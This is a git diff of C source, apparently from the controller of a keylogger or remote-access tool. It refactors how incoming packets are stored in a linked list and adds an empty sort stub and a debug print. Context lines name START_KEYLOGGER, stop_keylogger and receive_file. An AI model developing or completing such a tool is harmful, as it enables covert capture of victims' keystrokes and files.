@@ -20,11 +20,15 @@ void clear_process_packets(struct session_info * session_info) {
     session_info->packet_counter = 0;
 }
 
-bool handle_command_codes(struct session_info * session_info, const uint16_t data) {
+void sort_linked_list(struct packet_data * node) {
+
+}
+
+bool handle_command_codes(struct session_info * session_info, const struct packet_data * node) {
     enum command_codes encountered_command_code = {};
     bool is_command_code = true;
 
-    const uint8_t last_byte = data & 0xFF;
+    const uint8_t last_byte = node->data & 0xFF;
 
     switch (last_byte) {
         case START_KEYLOGGER:
@@ -72,10 +76,10 @@ bool handle_command_codes(struct session_info * session_info, const uint16_t dat
     return false;
 }
 
-void handle_packet_data(struct session_info * session_info, const uint16_t data) {
-    if (session_info->packet_counter == 0) {
-        handle_command_codes(session_info, data);
-        session_info->head->data = data;
+void handle_packet_data(struct session_info * session_info, struct packet_data * node) {
+    if (session_info->head == NULL) {
+        session_info->head = node;
+        handle_command_codes(session_info, node);
         session_info->packet_counter++;
         return;
     }
@@ -87,13 +91,13 @@ void handle_packet_data(struct session_info * session_info, const uint16_t data)
         packet_data = packet_data->next;
     }
 
+    // Sort LL
+
     // Add data
-    packet_data->next = malloc(sizeof(struct packet_data));
-    packet_data->next->data = data;
-    packet_data->next->next = NULL;
+    packet_data->next = node;
     session_info->packet_counter++;
 
-    const int clear_linked_list = handle_command_codes(session_info, data);
+    const int clear_linked_list = handle_command_codes(session_info, node);
 
     if (clear_linked_list) {
         log_message("Clearing linked list");
@@ -113,6 +117,8 @@ void stop_keylogger(struct session_info * session_info) {
 
 // NOLINTNEXTLINE
 void receive_file(struct session_info * session_info) {
+    print_linked_list(session_info->head);
+
     const int data_packet_to_read = calculate_data_packet_count(session_info);
     log_message("Data packets to read %d", data_packet_to_read);
     log_message("Packet counter: %d, Data Counter: %d", session_info->packet_counter, session_info->data_counter);
